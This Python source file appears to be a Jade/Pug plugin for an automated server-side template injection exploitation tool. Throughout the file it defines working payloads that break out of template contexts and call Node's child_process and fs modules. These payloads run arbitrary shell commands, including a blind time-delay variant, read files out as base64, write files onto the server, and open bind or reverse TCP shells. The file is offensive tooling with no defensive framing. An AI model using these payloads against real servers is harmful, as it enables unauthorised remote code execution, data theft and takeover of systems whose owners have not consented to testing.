from utils.strings import quote, chunkit, md5
from utils.loggers import log
from core import languages
from core.plugin import Plugin
from utils import rand
import base64

class Jade(Plugin):

    actions = {
        'render' : {
            'render': '\n= %(code)s\n',
            'header': '\n= %(header)s\n',
            'trailer': '\n= %(trailer)s\n'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk)s', 'base64'), 'binary')""",
            'truncate' : """global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
        },
        'read' : {
            'call': 'render',
            'read' : """= global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
        },
        'md5' : {
            'call': 'render',
            'md5': """- var x = global.process
- x = x.mainModule.require
= x('crypto').createHash('md5').update(x('fs').readFileSync('%(path)s')).digest("hex")
"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': '- %(code)s'
        },
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """\n- global.process.mainModule.require("child_process").execSync("%(code)s && sleep %(delay)i")//"""
        },
        'execute' : {
            'call': 'render',
            'execute': """= global.process.mainModule.require("child_process").execSync("%(code)s")"""
        },
        'tcp_shell' : {
            'call' : 'execute_blind',
            'tcp_shell': languages.bash_tcp_shell
        },
        'reverse_tcp_shell' : {
            'call': 'execute_blind',
            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
        }
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        # Attribute close a(href=\'%s\')
        { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : { 1: languages.javascript_ctx_closures[1] } },
        # String interpolation #{
        { 'level': 2, 'prefix' : '%(closure)s}', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },
        # Code context
        { 'level': 2, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },
    ]

    def detect_engine(self):

        execution_code = """= global.process.mainModule.require('os').platform()"""
        self.set('os', self.render(execution_code))
        self.set('language', 'javascript')
        self.set('evaluate', 'javascript')
        self.set('engine', 'jade')

    def execute(self, code, prefix = None, suffix = None, blind = False):
        # Quote code before submitting it
        return super(Jade, self).execute(quote(code), prefix, suffix, blind)

    def detect_blind_engine(self):

        if not self.get('blind'):
            return

        self.set('language', 'javascript')
        self.set('execute', True)
        self.set('engine', 'jade')
        self.set('evaluate', 'javascript')
